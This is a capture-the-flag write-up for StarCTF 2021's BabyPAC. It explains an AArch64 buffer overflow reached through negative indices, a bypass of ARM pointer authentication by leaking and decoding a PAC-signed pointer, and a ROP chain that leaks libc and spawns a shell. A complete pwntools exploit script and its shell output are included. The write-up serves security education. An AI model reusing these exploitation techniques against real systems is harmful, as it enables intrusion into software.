---
title: BabyPAC - StarCTF 2021
date: 2021-01-18 12:00:00
tags:
  - ARM
  - ROP
  - PAC
---

First ever ROP on the ARM architecture, and bypassing ARM's PAC mitigation - really cool challenge!

**tl;dr**
+ Buffer overflow in AArch64
+ Bypass pointer authentication to leak libc and get shell

## Initial analysis

The challenge handout contained a challenge file, along with libc and loader files. The given binary was of `aarch64` architecture, and we were able to setup a debugging environment using `qemu` and `gdb-multiarch`.
The mitigations enabled on the binary were as follows:

```text
Arch:     aarch64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

The challenge first asked for a name as input, and then a menu driver, which contained 4 options, namely `add`, `lock`, `show`, `auth`, and `exit`.

```text
input your name: abcd

=== BabyPAC ===
1. add
2. lock
3. show
4. auth
5. exit
>>
```

## Reversing

The name was inputted into the address `0x412030`, on bss, with a max size of `0x20`.

### Add:

This function allowed us to input a string `identity`, which was converted into an integer value using `atoi`, and stored in an array starting from the address `0x412050`, with each consecutive input being stored in `index*2` of the array, and allowed a maximum of 5 such inputs.

```c
for ( i = 0LL; ; ++i )
{
    v0 = 0;
    if ( i < 5 )
        v0 = qword_412050[2 * i] != 0LL;
    if ( !v0 )
        break;
}
if ( i != 5 )
{
    printf("identity: ");
    qword_412050[2 * i] = sub_400988();
    qword_412050[2 * i + 1] = 0LL;
}
```

### Lock:

This function took an integer (say `idx`) as input, and called a function `encode` on the array at address `0x412050`, with the index being equal to `2*idx`, and stored 1L at index `2*idx+1`, only if there was a value present at that index, and the value at the next index was 0.

```c
printf("idx: ");
result = sub_400988();
v1 = result;
if ( (int)result < 5 && *(_QWORD *)&byte_412030[16 * (int)result + 32] && !*(_QWORD *)&byte_412030[16 * (int)result + 40] )
{
    result = encode(qword_412050[2 * (int)result]);
    qword_412050[2 * v1] = result;
    qword_412050[2 * v1 + 1] = 1LL;
}
return result;
```

### Show:

This function first printed the name entered earlier (value stored at `0x412030`), and then printed each value of the array if they existed, and if the value was not locked (encoded by lock function). If the value was locked, it would print `**censored**`.

```c
result = printf("name: %s\n", byte_412030);
for ( i = 0; i < 5; ++i )
{
    if ( qword_412050[2 * i] )
    {
        if ( qword_412050[2 * i + 1] == 1LL )
            result = printf("%d: **censored**\n", (unsigned int)i);
        else
            result = printf("%d: %ld\n", (unsigned int)i, qword_412050[2 * i]);
    }
}
return result;
```

### Auth:

This function took an integer (say `idx`) as input, and if there was a value present at the array `0x412050` of the entered index, and the value at the next index was 1 (i.e if lock had been called on that index), it compared the value with the result of `encode(0x10A9FC70042)`, and if they were the same, it called a function which gave us a `0x100` byte read, and an obvious buffer overflow.

```c
printf("idx: ");
result = sub_400988();
if ( (int)result < 5 && *(_QWORD *)&byte_412030[16 * (int)result + 32] && *(_QWORD *)&byte_412030[16 * (int)result + 40] == 1LL )
{
    v1 = *(_QWORD *)&byte_412030[16 * (int)result + 32];
    result = encode(0x10A9FC70042LL);
    if ( v1 == result )
        result = overflow();
}
return result;
```

### Encode:

This was a bit of a complicated function, it took a value `a1` as input and performed a number of bit-shift and xor operations on the input.

```c
return a1 ^ (a1 << 7) ^ ((a1 ^ (a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (a1 << 7)) >> 11)) << 31) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (a1 << 7)) >> 11)) << 31)) >> 13);
```

## Vulnerability & bypassing PAC

After reversing, it was pretty clear that we needed to encode a value equal to `0x10A9FC70042` to trigger the buffer overflow, however `atoi` only allowed us to input a 4-byte value, so it wasnt possible to enter this value in the `add` function. However, there was no check for negative indices in the `lock` and `auth` functions, so this caused an integer overflow, allowing us to input a negative index (-1 or -2) to access the `name` buffer, where we could store this value (`0x10A9FC70042`), lock(encode) it and therefore bypass the auth and access the function which gave us a buffer overflow.

Following this, we got PC control, or so we initially thought. The `RET` instruction for this overflow function wasn't a normal `RET`, it was instead a `RETAA` instruction, which checked whether the pointer was properly PAC-encoded or not, and if it was, the pc value was set to the pointer, and if it was not, the second most significant byte of the pointer was set to `0x20`, making it an invalid address and hence causing a segmentation fault. On further research, we found that this PAC encoding was done using multiple factors - namely the pointer itself, the stack base, and a key which could not be viewed in userspace. Since it wasnt possible to access the key, it wasnt possible to predict this encryption directly.

```text
0x0000000000400e84 -> Normal pointer to main
0x0027000000400e84 -> PAC-encoded pointer to main
```

However, we soon realized that the input to the `encode` function in `lock` was the PAC-encoded version of the original pointer, and we could use `show` to leak the result of this (at a negative index only, namely the name buffer). So [sherl0ck](https://twitter.com/sherl0ck__) reversed the encode function, and wrote a function that would return the PAC-encoded pointer, given the original pointer that was passed to `lock` and the result of `encode`. This way we could get a single PAC-encoded pointer by passing the original into `name`, leaking the result of `lock(-2)` using `show`, and then using the aforementioned function to get the PAC-encoded version of the pointer, thus allowing us to bypass `RETAA`.

## Exploitation

At this point, we had RIP control, but we could only PAC-encode a single gadget. This meant that all the other return instructions would need to be normal `RET` instead of `RETAA` instructions. It is important to note that for `aarch64` architecture, the first 3 arguments are passed through the registers `x0`, `x1` and `x2`, and the `RET` instruction operates in a slightly different way. Instead of popping a value off the stack, it moves the value of `x30` into the PC, and continues with program flow.

So to leak libc, we would need a gadget that sets `x0` based on a value on the stack, and sets `x30` based on a value on the stack. Unlike `x32` or `x64` ROP, we cannot always link gadgets using `RET`, as we may not always have control over the `x30` register. And looking through all the gadgets present in the binary, we didn't find a single gadget that gives us control over both `x0` and `x30` registers.

Luckily, we found these couple of interesting gadgets:
```cpp
0x400ff8 : ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
0x400fd8 : ldr x3, [x21, x19, lsl #3] ; mov x2, x24 ; add x19, x19, #1 ; mov x1, x23 ; mov w0, w22 ; blr x3
```
The first gadget sets the value of the registers `x19`, `x20`, `x21`, `x22`, `x23`, `x24`, `x29` and `x30` based on values at specific stack offsets, which we had control over, and then calls `RET`, which is usable because we have control over `x30`. The second gadget however is more interesting. The first instruction is `ldr x3, [x21, x19, lsl #3]`, which sets `x3` to the values pointed to be `x21`, with an index of `$x19 * 3`. Since we had control over `x21` and `x19`, we could just set `x19` to 0, and `x3` would become the value pointed to by `x21`. The following instructions transfer the value of `x24` into `x2`, `x23` into `x1`, and `x22` into `x0`, which allows us to set upto 3 arguments for any function, as we have control over those registers. The next instruction is `blr x3`, which essentially calls the subroutine at `x3`, and sets `x30` to `pc + 4`.

So using these two registers, we can essentially set arguments and call any function, as long as we have a pointer to that function. So the plan was to initially call `puts@plt`, with a `GOT` address as its first argument. Now we needed a pointer to `puts@plt`. For this, we can use the add function, as `puts@plt` is less than 4 bytes, atoi will return the same value and it will get stored on bss. So then `0x412050` contained a pointer to `puts@plt`, and we were able to leak libc addresses.

For the final part of the exploit, we had to be able to return to main, and repeat the same process to call `system("/bin/sh")`, as we had libc leaks. I looked up the instructions following `blr x3`, and I saw the following:
```cpp
blr x3 ; cmp x20, x19 ; b.ne #0x400ff4 ; ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
```
This essentially meant that if `x20` and `x19` were equal, it would skip the jump, and then we had control over `x30`, which would subsequently give us control over PC and allow us to return to main. After `puts` was called, the value of `x19` was 1, so I set `x20` to 1 with the gadgets used earlier, and we got PC control!

THe rest of the exploit was straightforward. As we couldnt get a pointer to system(or any other libc gadget), as they were greater than 4 bytes, we PAC-encoded then returned back to the same gadgets used earlier, and instead of returning to main, we used the following gadget to pass a pointer to `/bin/sh` into `x0`, and then call `system`:
```cpp
0x63c0c : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
```
Following this, we got a shell!

## Exploit script

```python
#!/usr/bin/python

from hashlib import *
from pwn import *
from pwnlib.util.iters import mbruteforce
import sys

remote_ip, port = '52.255.184.147', 8080

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "aarch64"
context.log_level = "debug"

global io

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

libc = ELF("./lib/libc.so.6")

def add(iden):
    sla(">> ","1")
    sla("identity: ",str(iden))

def lock(idx):
    sla(">> ","2")
    sla("idx: ",str(idx))

def show():
    sla(">> ","3")

def auth(idx):
    sla(">> ","4")
    sla("idx: ",str(idx))

def conv(inp, out):
    bi = bin(inp).strip().replace('0b','').rjust(64,'0')
    ni = [bi[i:i+8] for i in range(0, len(bi), 8)]
    ni = ni[::-1]

    bo = bin(out).strip().replace('0b','').rjust(64,'0')
    no = [bo[i:i+8] for i in range(0, len(bo), 8)]
    no = no[::-1]

    d1 = int(ni[3][7-0])
    d2 = int(ni[3][7-1])
    d3 = int(ni[3][7-2])
    d4 = int(ni[3][7-3])
    d5 = int(ni[3][7-4])
    d6 = int(ni[3][7-5])
    d7 = int(ni[3][7-6])
    d8 = int(ni[3][7-7])

    c1 = int(ni[2][7-0])
    c2 = int(ni[2][7-1])
    c3 = int(ni[2][7-2])
    c4 = int(ni[2][7-3])
    c5 = int(ni[2][7-4])
    c6 = int(ni[2][7-5])
    c7 = int(ni[2][7-6])
    c8 = int(ni[2][7-7])

    y7 = d7^c8
    y6 = d6^c7
    y5 = d5^c6
    y4 = d4^c5
    y3 = d3^c4
    y2 = d2^c3
    y1 = d1^c2

    g1 = y4^d8
    g2 = y2^d7
    g3 = y3^d6
    g4 = y1^d5

    r7=int(no[7][2])
    r6=int(no[7][3])
    r5=int(no[7][4])
    r4=int(no[7][5])
    r3=int(no[7][6])
    r2=int(no[7][7])
    r1=int(no[6][0])

    p7 = y7 ^ r7
    p6 = y6 ^ r6
    p5 = y5 ^ r5
    p4 = g1 ^ r4
    p3 = g2 ^ r3
    p2 = g3 ^ r2
    p1 = g4 ^ r1

    return (int(str(p7)+str(p6)+str(p5)+str(p4)+str(p3)+str(p2)+str(p1), 2) << 48) | inp

puts_plt = 0x4006c0
printf_got = 0x411fe0
name_addr = 0x412030
gadget1 = 0x400fd8
gadget2 = 0x400ff8
main = 0x400e84

def bruteforce(pt, ct):
    hashtype = sha256
    pt = pt.decode()
    digest = ct.decode()
    prefix = mbruteforce(
        lambda x: hashtype((x+pt).encode()).hexdigest() == digest,
        string.ascii_letters+string.digits,
        length = 4,
        method = "fixed"
    )
    return prefix

def poc(io):
    pt, ct = io.recvuntil('xxxx:\n')[:-15].split(' == ')
    io.sendline(bruteforce(pt[12:-1],ct))

def pwn(io):
    name = p64(gadget2)
    name += p64(0)
    name += p64(0x10A9FC70042)
    name += p64(0)
    io.sendafter("input your name: ",name)
    lock(-2)
    show()
    io.recvuntil("name: ")
    leak2 = u64(io.recv(8))
    new_gadget = conv(gadget2, leak2)
    add(puts_plt)
    lock(-1)
    auth(-1)
    payload = "a"*0x28
    payload += flat([
        new_gadget, #pc
        0, #x29
        gadget1, #x30
        0, #x19
        1, #x20
        name_addr + 0x20, #x21
        printf_got, #x22
        printf_got, #x23
        printf_got, #x24
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main
    ])
    io.send(payload)
    libc.address = u64((io.recv(3)+"\x00\x40").ljust(8,"\x00")) - libc.symbols['printf']
    log.info("Libc base -> "+hex(libc.address))

    system = libc.symbols['system']
    binsh = next(libc.search("/bin/sh"))

    log.info("System -> "+hex(system))
    log.info("Binsh -> "+hex(binsh))

    libcgadget = libc.address + 0x63c0c

    name = p64(gadget2)
    name += p64(0)
    name += p64(0x10A9FC70042)
    name += p64(0)
    io.sendafter("input your name: ",name)
    lock(-2)
    show()
    io.recvuntil("name: ")
    leak2 = u64(io.recv(8))
    new_gadget = conv(gadget2, leak2)
    add(puts_plt)
    lock(-1)
    auth(-1)
    payload = "a"*0x28
    payload += flat([
        new_gadget, #pc
        0, #x29
        gadget1, #x30
        0, #x19
        1, #x20
        name_addr + 0x20, #x21
        printf_got, #x22
        printf_got, #x23
        printf_got, #x24
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        system,
        system,
        binsh,
        binsh
    ])
    io.send(payload)

    io.interactive()

if __name__ == "__main__":
    io = remote(remote_ip, port)
    poc(io)
    pwn(io)
```

## Flag

```console
d4rk_kn1gh7 @ BatMobile  python exp.py
[+] Opening connection to 52.255.184.147 on port 8080: Done
[+] MBruteforcing: Found key: "t5iG"
[*] Libc base -> 0x4000838000
[*] System -> 0x4000878400
[*] Binsh -> 0x400095ecc0
[*] Switching to interactive mode
$ cat flag
*CTF{n0w_y0u_kn0w_p01nter_authent1cat10n}
```